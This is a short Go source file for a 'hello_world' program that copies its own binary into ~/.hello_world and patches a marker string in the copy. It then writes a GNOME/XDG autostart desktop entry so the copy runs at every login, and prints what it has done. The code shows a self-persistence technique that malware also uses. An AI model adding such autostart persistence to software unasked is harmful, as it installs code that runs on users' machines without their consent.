package main

import (
	"fmt"
	"io/ioutil"
	"os"
	"path/filepath"
	"strings"
)

func HasPersisted() bool {
	// Check if the directory and file exist in the user's home directory
	dirPath := filepath.Join(os.Getenv("HOME"), ".hello_world")
	persistFile := filepath.Join(dirPath, "persisted")
	if _, err := os.Stat(dirPath); os.IsNotExist(err) {
		return false
	}
	if _, err := os.Stat(persistFile); os.IsNotExist(err) {
		return false
	}
	return true
}

func Persist() error {
	// Get the current executable's path
	ex, err := os.Executable()
	if err != nil {
		return err
	}

	// Read the binary of the current executable
	binary, err := ioutil.ReadFile(ex)
	if err != nil {
		fmt.Println(err)
		return err
	}

	// Replace the "NOT_PERSISTED" string with "HAS_PERSISTED"
	binary = []byte(strings.Replace(string(binary), "NOT_PERSISTED", "HAS_PERSISTED", -1))

	// Create a new directory in the user's home directory
	dirPath := filepath.Join(os.Getenv("HOME"), ".hello_world")
	err = os.MkdirAll(dirPath, 0755)
	if err != nil {
		fmt.Println(err)
		return err
	}

	// Write the binary to the new directory
	newPath := filepath.Join(dirPath, "hello_world")
	err = ioutil.WriteFile(newPath, binary, 0755)
	if err != nil {
		fmt.Println(err)
		return err
	}

	// Create a new autostart file in the user's home directory
	autostartPath := filepath.Join(os.Getenv("HOME"), ".config/autostart/hello_world.desktop")
	file, err := os.Create(autostartPath)
	if err != nil {
		return err
	}

	defer file.Close()

	// Write the autostart file contents
	_, err = file.WriteString("[Desktop Entry]\nType=Application\nExec=" + newPath + "\nHidden=false\nNoDisplay=false\nX-GNOME-Autostart-enabled=true\nName=Hello World\nComment=Autostart Hello World program")
	if err != nil {
		return err
	}

	fmt.Println("Program has been copied to", newPath)
	fmt.Println("and an autostart file has been created to run the program on startup.")

	return nil
}
